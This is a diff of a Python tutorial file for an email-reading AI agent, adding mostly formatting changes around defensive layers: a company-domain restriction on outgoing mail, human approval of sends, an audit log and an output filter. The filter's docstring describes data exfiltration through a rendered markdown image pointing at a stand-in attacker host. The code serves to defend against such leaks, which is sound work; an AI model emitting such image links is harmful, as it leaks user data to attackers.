@@ -16,7 +16,7 @@ import anthropic
 from day10_ask_the_manual import search
 from day11_agent import INBOX_PATH, LEAVE_BALANCES, MAX_STEPS, SECTIONS, SENT_LOG
 
-MODEL = "claude-opus-5"
+MODEL = "claude-opus-5-5"
 CURRENT_USER = "E001"
 COMPANY_DOMAIN = "mawingu.example"
 AUDIT_LOG = Path(__file__).parent / "audit.log"
@@ -102,7 +102,9 @@ def run_tool(name: str, args: dict) -> str:
             audit(f"BLOCKED email to {to}")
             return f"Blocked: email can only be sent to @{COMPANY_DOMAIN} addresses."
         # LAYER 3b: a human approves every irreversible action.
-        print(f"\n  The assistant wants to send an email:\n  TO: {to}\n  SUBJECT: {args['subject']}\n\n{args['body']}\n")
+        print(
+            f"\n  The assistant wants to send an email:\n  TO: {to}\n  SUBJECT: {args['subject']}\n\n{args['body']}\n"
+        )
         if input("  Send it? (y/n): ").strip().lower() != "y":
             audit(f"DECLINED email to {to}")
             return "The user declined to send this email."
@@ -120,6 +122,7 @@ def clean_output(text: str) -> str:
     ![](https://evil.example/?data=...). If the app renders that image,
     the user's browser sends the data to the attacker automatically.
     """
+
     def keep_or_remove(match: re.Match) -> str:
         url = match.group(0)
         return url if COMPANY_DOMAIN in url else "[external link removed]"
@@ -150,11 +153,13 @@ def run_agent(messages: list) -> str:
         for block in response.content:
             if block.type == "tool_use":
                 print(f"  [tool] {block.name}({json.dumps(block.input)})")
-                results.append({
-                    "type": "tool_result",
-                    "tool_use_id": block.id,
-                    "content": run_tool(block.name, block.input),
-                })
+                results.append(
+                    {
+                        "type": "tool_result",
+                        "tool_use_id": block.id,
+                        "content": run_tool(block.name, block.input),
+                    }
+                )
         messages.append({"role": "user", "content": results})
 
     return "[Stopped: too many steps.]"
